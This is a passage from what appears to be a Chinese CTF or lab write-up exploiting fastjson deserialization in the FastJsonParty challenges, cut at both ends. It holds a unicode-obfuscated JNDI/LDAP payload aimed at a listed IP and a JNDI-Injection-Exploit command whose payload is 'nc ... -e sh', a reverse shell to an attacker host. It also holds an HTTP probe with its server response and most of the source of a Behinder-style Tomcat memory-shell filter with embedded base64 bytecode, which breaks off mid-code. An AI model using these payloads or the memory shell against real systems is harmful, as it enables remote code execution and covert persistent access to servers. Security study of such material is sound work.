class="token property">"\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065"</span><span class="token operator">:</span><span class="token string">"\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0031\u0032\u0033\u002E\u0036\u0030\u002E\u0031\u0035\u0037\u002E\u0031\u0039\u0034\u003A\u0031\u0033\u0038\u0039\u002F\u0071\u007A\u0039\u006E\u006F\u0065"</span><span class="token punctuation">,</span>        <span class="token property">"\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击机开启监听端口</p><blockquote><p>root@n0rt6:~# nc -lnvp 9999</p></blockquote><p>使用<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>开启服务:</p><blockquote><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 123.60.157.194 -C “nc 123.60.157.194 9999 -e sh”</p></blockquote><p><img src="https://img-blog.csdnimg.cn/direct/2d8acba4072d4c879ea4ab10af91e135.png" alt="123"></p><h2 id="1247-waf-c3p0（不出网）"><a href="#1247-waf-c3p0（不出网）" class="headerlink" title="1247-waf-c3p0（不出网）"></a>1247-waf-c3p0（不出网）</h2><p>检测是否是fastjson<br>dnslog测试<br><img src="https://img-blog.csdnimg.cn/direct/53df35833bc04995aa2c060a77358560.png" alt="123"><br>探测fastjson版本<br><img src="https://img-blog.csdnimg.cn/direct/4c995cb6fab94fec9d20e7f9b53bb337.png" alt="123"><br>爆出的版本为1.2.47，在这个版本下fastjson存在mappings缓存通杀绕过，利用方式为jndi</p><h3 id="jndi利用条件"><a href="#jndi利用条件" class="headerlink" title="jndi利用条件"></a>jndi利用条件</h3><p>1、环境一般出网<br>2、收到JDK版本限制，JDK8u191后受到trusturlcodebase限制了远程加载，当然还有绕过方法。</p><p>这台靶机不出网，因此JNDI注入不合适</p><p><img src="https://img-blog.csdnimg.cn/direct/e9f3324d282145459da43ecb64c887c1.png" alt="13"></p><p>下一步探测存在的依赖：<strong>利用Character转换报错可以判断存在哪种依赖</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /login HTTP/1.1Host: 123.60.157.194Content-Length: 127Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36Content-Type: application/json; charset=UTF-8Origin: http://123.60.157.194Referer: http://123.60.157.194/tologinAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close&#123;"x":&#123;"@type":"java.lang.Character"&#123;"@type":"java.lang.Class","val":"org.springframework.web.bind.annotation.RequestMapping"&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 500 Server: nginx/1.15.12Date: Thu, 28 Mar 2024 15:37:12 GMTContent-Type: application/jsonConnection: closeContent-Length: 212&#123;"timestamp":"2024-03-28T15:37:12.688+0000","status":500,"error":"Internal Server Error","message":"can not cast to char, value : interface org.springframework.web.bind.annotation.RequestMapping","path":"/login"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>RequestMapping</code>本身为SpringBoot下的类，当存在该类时会爆出类型转换错误，说明为SpingBoot项目。<br>否则无显示：<br><img src="https://img-blog.csdnimg.cn/direct/3abf7d9a95f04a0c8c245a4823dc9a2b.png" alt="123"><br>那么接下来就尝试fastjson利用链poc所需要的依赖类<br><img src="https://img-blog.csdnimg.cn/direct/e41ac08321b34bd2a5a6e162655f816f.png" alt="132"></p><p>下面真的不会了<a href="https://github.com/lemono0/FastJsonParty/blob/main/1247-waf-c3p0/write-up.md">查看资料</a>进行复现吧🥱<br>更改一个冰蝎的内存马编译为FRain.java文件编译为class文件。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//FRain.java</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">SecretKeySpec</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">DispatcherType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpSession</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">ApplicationFilterConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">StandardContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span><span class="token class-name">WebappClassLoaderBase</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>descriptor<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">FilterDef</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>descriptor<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">FilterMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span><span class="token class-name">BASE64Decoder</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IceShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> pa <span class="token operator">=</span> <span class="token string">"3ad2fddfe8bad8e6"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">IceShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>        <span class="token class-name">HttpServletResponse</span> response <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span>servletResponse<span class="token punctuation">;</span>        <span class="token class-name">HttpSession</span> session <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> pageContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">;</span>        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ClassLoader</span> cl <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Class</span> <span class="token class-name">Lclass</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">RushThere</span><span class="token punctuation">(</span><span class="token class-name">Class</span> <span class="token class-name">Lclass</span><span class="token punctuation">,</span> <span class="token class-name">ClassLoader</span> cl<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> pageContext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Method</span> define <span class="token operator">=</span> <span class="token class-name">Lclass</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            define<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Class</span> uclass <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                uclass <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"U"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var18<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                uclass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>define<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>cl<span class="token punctuation">,</span> bytecode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytecode<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> uclass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token 